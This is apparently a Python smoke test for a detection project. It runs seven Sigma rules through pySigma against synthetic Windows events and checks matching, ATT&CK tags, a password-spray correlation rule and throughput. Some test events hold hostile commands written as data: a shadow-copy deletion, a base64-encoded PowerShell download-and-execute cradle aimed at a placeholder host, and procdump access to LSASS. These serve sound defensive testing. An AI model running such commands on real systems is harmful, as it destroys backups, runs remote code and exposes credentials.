"""Smoke check for detection (ADR 0003): pySigma's native in-memory matcher against Nightjar's ECS-like events.

Verifies on this machine:
  1. rules parse (SigmaCollection) and compile with a field-mapping ProcessingPipeline (Sigma Windows field
     names → Nightjar's ECS-like names, e.g. `Image` → `process.executable`)
  2. modifiers: endswith, contains|all, contains|windash, wide|base64offset|contains, re, cidr, windash; keyword-free field logic;
     `1 of selection_*`, `not filter`
  3. ATT&CK tags come through for mapping (`attack.t1003.001` → T1003.001)
  4. a Sigma correlation rule (event_count, group-by, timespan) fires once on a password spray
  5. throughput on this laptop (events/s over N rules) and, if `data/sigma/` exists, the parse/compile
     rate over the downloaded SigmaHQ subset

    python scripts/smoke/sigma_smoke.py
"""

from __future__ import annotations

import time
from datetime import UTC, datetime, timedelta
from importlib.metadata import version
from pathlib import Path
from typing import Any

from sigma.collection import SigmaCollection
from sigma.matching import Event, EventLogSource, SigmaMatcher
from sigma.processing.pipeline import ProcessingItem, ProcessingPipeline
from sigma.processing.transformations import FieldMappingTransformation
from sigma.rule import SigmaRule

ROOT = Path(__file__).resolve().parents[2]

FIELD_MAP = {
    "Image": "process.executable",
    "OriginalFileName": "process.pe.original_file_name",
    "CommandLine": "process.command_line",
    "ParentImage": "process.parent.executable",
    "User": "user.name",
    "TargetImage": "target.process.executable",
    "GrantedAccess": "winlog.event_data.GrantedAccess",
    "EventID": "event.code",
    "TargetUserName": "user.name",
    "IpAddress": "source.ip",
    "LogonType": "winlog.event_data.LogonType",
    "DestinationIp": "destination.ip",
    "DestinationPort": "destination.port",
}

RULES = """
title: LSASS Memory Access by Dump Tool
id: 5d3a0f4e-0001-4c55-9a1e-3a0c3ef0a001
status: test
description: Detects a process opening LSASS with read access typical of credential dumping
tags: [attack.credential-access, attack.t1003.001]
logsource: {category: process_access, product: windows}
detection:
  selection:
    TargetImage|endswith: '\\lsass.exe'
    GrantedAccess: ['0x1010', '0x1410', '0x1fffff']
  filter_av:
    Image|endswith: '\\MsMpEng.exe'
  condition: selection and not filter_av
level: high
---
title: Shadow Copy Deletion
id: 5d3a0f4e-0002-4c55-9a1e-3a0c3ef0a002
status: test
description: Inhibit system recovery by deleting volume shadow copies
tags: [attack.impact, attack.t1490]
logsource: {category: process_creation, product: windows}
detection:
  selection_vss:
    Image|endswith: '\\vssadmin.exe'
    CommandLine|contains|all: ['delete', 'shadows']
  selection_wmic:
    Image|endswith: '\\wmic.exe'
    CommandLine|contains|all: ['shadowcopy', 'delete']
  condition: 1 of selection_*
level: critical
---
title: Encoded PowerShell Download Cradle
id: 5d3a0f4e-0003-4c55-9a1e-3a0c3ef0a003
status: test
description: PowerShell launched with an encoded command that downloads content
tags: [attack.execution, attack.t1059.001]
logsource: {category: process_creation, product: windows}
detection:
  selection:
    Image|endswith: ['\\powershell.exe', '\\pwsh.exe']
    CommandLine|contains|windash: ' -enc '
    CommandLine|wide|base64offset|contains: 'DownloadString'
  condition: selection
level: high
---
title: Office Application Spawning a Shell
id: 5d3a0f4e-0004-4c55-9a1e-3a0c3ef0a004
status: test
description: Phishing payload execution from an Office document
tags: [attack.execution, attack.t1204.002]
logsource: {category: process_creation, product: windows}
detection:
  selection:
    ParentImage|endswith: ['\\WINWORD.EXE', '\\EXCEL.EXE', '\\OUTLOOK.EXE']
    Image|re: '(?i).*\\\\(cmd|powershell|wscript|mshta)\\.exe$'
  condition: selection
level: high
---
title: Outbound Connection to Rare Range
id: 5d3a0f4e-0005-4c55-9a1e-3a0c3ef0a005
status: test
description: Host connects to an address in a watched range
tags: [attack.command-and-control, attack.t1071.001]
logsource: {category: network_connection, product: windows}
detection:
  selection:
    DestinationIp|cidr: '185.220.100.0/22'
    DestinationPort: 443
  condition: selection
level: medium
---
title: Failed Logon
id: 5d3a0f4e-0006-4c55-9a1e-3a0c3ef0a006
name: failed_logon
status: test
description: Failed network logon
tags: [attack.credential-access, attack.t1110.003]
logsource: {product: windows, service: security}
detection:
  selection:
    EventID: 4625
    LogonType: 3
  condition: selection
level: low
---
title: Password Spray From One Source
id: 5d3a0f4e-0007-4c55-9a1e-3a0c3ef0a007
status: test
correlation:
  type: value_count
  rules: [failed_logon]
  group-by: [IpAddress]
  timespan: 10m
  condition: {gte: 5, field: TargetUserName}
tags: [attack.credential-access, attack.t1110.003]
level: high
"""


def pipeline() -> ProcessingPipeline:
    return ProcessingPipeline(
        name="nightjar-ecs",
        priority=20,
        items=[ProcessingItem(identifier="ecs-fields", transformation=FieldMappingTransformation(FIELD_MAP))],
    )


def flatten(obj: dict[str, Any], prefix: str = "") -> dict[str, Any]:
    out: dict[str, Any] = {}
    for k, v in obj.items():
        key = f"{prefix}{k}"
        if isinstance(v, dict):
            out.update(flatten(v, key + "."))
        else:
            out[key] = v
    return out


def to_event(ecs: dict[str, Any], category: str | None, service: str | None = None) -> Event:
    return Event(
        timestamp=datetime.fromisoformat(ecs["@timestamp"]),
        logsource=EventLogSource(category=category, product="windows", service=service),
        data=flatten(ecs),
    )


def techniques(rule: Any) -> list[str]:
    return sorted(
        t.name.upper() for t in (rule.tags or []) if t.namespace == "attack" and t.name.lower().startswith("t")
    )


def check(label: str, ok: bool, detail: str = "") -> None:
    print(f"  [{'PASS' if ok else 'FAIL'}] {label}{(': ' + detail) if detail else ''}")
    if not ok:
        raise SystemExit(1)


def main() -> None:
    import base64

    print(f"pySigma {version('pySigma')}")
    collection = SigmaCollection.from_yaml(RULES)
    check("rules parsed", len(collection.rules) == 7, f"{len(collection.rules)} rules")
    matcher = SigmaMatcher(collection, pipeline=pipeline())

    t0 = datetime(2025, 11, 20, 3, 12, 4, tzinfo=UTC)
    ts = t0.isoformat()
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')".encode("utf-16le")).decode()
    cases = [
        (
            "lsass dump",
            "process_access",
            {
                "@timestamp": ts,
                "process": {"executable": "C:\\Tools\\procdump64.exe"},
                "target": {"process": {"executable": "C:\\Windows\\System32\\lsass.exe"}},
                "winlog": {"event_data": {"GrantedAccess": "0x1fffff"}},
            },
            "LSASS Memory Access by Dump Tool",
        ),
        (
            "lsass by defender (filtered)",
            "process_access",
            {
                "@timestamp": ts,
                "process": {"executable": "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe"},
                "target": {"process": {"executable": "C:\\Windows\\System32\\lsass.exe"}},
                "winlog": {"event_data": {"GrantedAccess": "0x1410"}},
            },
            None,
        ),
        (
            "vssadmin",
            "process_creation",
            {
                "@timestamp": ts,
                "process": {
                    "executable": "C:\\Windows\\System32\\vssadmin.exe",
                    "command_line": "vssadmin.exe Delete Shadows /All /Quiet",
                },
            },
            "Shadow Copy Deletion",
        ),
        (
            "encoded cradle",
            "process_creation",
            {
                "@timestamp": ts,
                "process": {
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "command_line": f"powershell.exe -nop /enc {enc}",
                },
            },
            "Encoded PowerShell Download Cradle",
        ),
        (
            "word → cmd",
            "process_creation",
            {
                "@timestamp": ts,
                "process": {
                    "executable": "C:\\Windows\\System32\\cmd.exe",
                    "parent": {"executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"},
                },
            },
            "Office Application Spawning a Shell",
        ),
        (
            "benign excel",
            "process_creation",
            {
                "@timestamp": ts,
                "process": {
                    "executable": "C:\\Windows\\System32\\notepad.exe",
                    "parent": {"executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"},
                },
            },
            None,
        ),
        (
            "cidr hit",
            "network_connection",
            {"@timestamp": ts, "destination": {"ip": "185.220.101.4", "port": 443}},
            "Outbound Connection to Rare Range",
        ),
        ("cidr miss", "network_connection", {"@timestamp": ts, "destination": {"ip": "10.20.0.4", "port": 443}}, None),
    ]
    for label, cat, ecs, expected in cases:
        titles = [m.rule.title for m in matcher.match(to_event(ecs, cat))]
        check(f"{label}", (expected in titles) if expected else not titles, ", ".join(titles) or "no match")

    lsass_rule = next(r for r in collection.rules if isinstance(r, SigmaRule) and "LSASS" in r.title)
    check("ATT&CK technique ids from tags", techniques(lsass_rule) == ["T1003.001"], str(techniques(lsass_rule)))

    # correlation: 6 users from one IP within 10 minutes → one value_count match
    corr_hits = []
    for i, user in enumerate(["a.ng", "b.cole", "c.diaz", "d.evans", "e.fox", "f.gale"]):
        ecs = {
            "@timestamp": (t0 + timedelta(seconds=30 * i)).isoformat(),
            "event": {"code": 4625},
            "user": {"name": user},
            "source": {"ip": "203.0.113.50"},
            "winlog": {"event_data": {"LogonType": 3}},
        }
        corr_hits += [m for m in matcher.match(to_event(ecs, None, "security")) if "Spray" in m.rule.title]
    check("correlation rule (value_count by source ip)", len(corr_hits) >= 1, f"{len(corr_hits)} match(es)")

    # throughput
    n = 20_000
    events = [to_event(cases[i % len(cases)][2], cases[i % len(cases)][1]) for i in range(n)]
    start = time.perf_counter()
    for e in events:
        matcher.match(e)
    rate = n / (time.perf_counter() - start)
    check("throughput over 7 rules", rate > 5_000, f"{rate:,.0f} events/s")

    subset = ROOT / "data" / "sigma"
    files = sorted(subset.rglob("*.yml")) if subset.exists() else []
    if files:
        ok = bad = 0
        loaded = []
        for f in files:
            try:
                coll = SigmaCollection.from_yaml(f.read_text())
                SigmaMatcher(coll, pipeline=pipeline())
                loaded += coll.rules
                ok += 1
            except Exception:
                bad += 1
        big = SigmaMatcher(SigmaCollection(loaded), pipeline=pipeline())
        start = time.perf_counter()
        for e in events[:5000]:
            big.match(e)
        rate = 5000 / (time.perf_counter() - start)
        print(f"  [INFO] SigmaHQ subset: {ok}/{ok + bad} files compile; {len(loaded)} rules; {rate:,.0f} events/s")
    else:
        print("  [INFO] data/sigma not downloaded (make data); skipped the SigmaHQ subset check")
    print("Sigma smoke: PASS")


if __name__ == "__main__":
    main()
